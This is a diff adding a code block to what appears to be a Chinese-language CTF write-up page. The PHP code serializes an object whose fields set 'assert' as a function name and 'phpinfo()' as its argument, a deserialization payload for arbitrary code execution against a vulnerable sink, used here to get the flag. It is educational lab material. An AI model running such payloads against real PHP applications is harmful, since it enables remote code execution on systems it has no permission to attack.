@@ -84,6 +84,8 @@
 <p>观察到echo $b($a);</p>
 <p>使用</p>
 <p> $this-&gt;a &#x3D; “phpinfo()”;<br> $this-&gt;b &#x3D; “assert”;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &#x27;assert&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line">print_r(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <p>3.<img src="/2022/11/25/fg/chicken.jpg" alt="进程图"></p>
 <p>获得flag</p>
 
